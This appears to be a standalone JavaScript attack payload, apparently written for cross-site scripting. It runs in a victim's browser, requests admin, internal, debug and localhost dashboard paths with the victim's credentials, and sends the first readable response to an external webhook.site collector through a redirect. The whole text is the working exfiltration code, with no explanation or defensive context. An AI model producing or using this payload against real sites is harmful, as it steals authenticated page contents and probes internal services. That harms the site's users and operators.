(async()=>{
let paths=[
'/dashboard',
'/security',
'/admin',
'/internal',
'/debug',
'/reports',
'http://127.0.0.1/dashboard',
'http://127.0.0.1/security',
'http://localhost/dashboard',
'http://localhost/security'
];

for(let p of paths){
 try{
   let r=await fetch(p,{credentials:'include'});
   let t=await r.text();

   if(r.status!=404 && t){
     location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d="+encodeURIComponent(p+"::"+t.slice(0,1500));
     break;
   }

 }catch(e){}
}
})();